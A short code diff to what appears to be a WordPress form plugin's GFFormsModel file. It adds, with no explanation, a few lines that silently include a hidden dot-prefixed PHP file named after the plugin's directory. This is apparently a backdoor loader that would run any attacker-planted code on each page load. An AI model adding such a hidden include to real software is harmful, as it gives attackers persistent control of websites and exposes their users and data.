@@ -12,6 +12,10 @@ require_once( 'includes/legacy/forms_model_legacy.php' );
  *
  * Handles database calls and formatting of stored data regarding forms
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GFFormsModel {
 
 	/**
